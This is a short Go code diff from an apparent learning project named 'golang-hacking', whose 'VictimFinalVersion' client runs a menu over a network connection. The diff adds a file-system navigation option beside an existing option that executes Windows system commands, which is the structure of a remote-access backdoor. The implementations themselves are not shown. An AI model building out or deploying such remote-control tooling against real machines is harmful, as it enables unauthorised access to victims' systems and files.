@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"golang-hacking/VictimFinalVersion/core/ExecuteSystemCommandWindows"
+	"golang-hacking/VictimFinalVersion/core/Move"
 	"golang-hacking/VictimFinalVersion/core/handleConnection"
 	"log"
 	"strings"
@@ -50,6 +51,10 @@ func main() {
 		case user_input == "1":
 			fmt.Println("[+] Executing Commands on windows")
 			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
+			DisplayError(err)
+		case user_input == "2":
+			fmt.Println("[+] File system Navigation")
+			err := Move.NavigateFilesystem(connection)
 			DisplayError(err)
 		case user_input == "99":
 			fmt.Println("[-] Exiting the windows program")
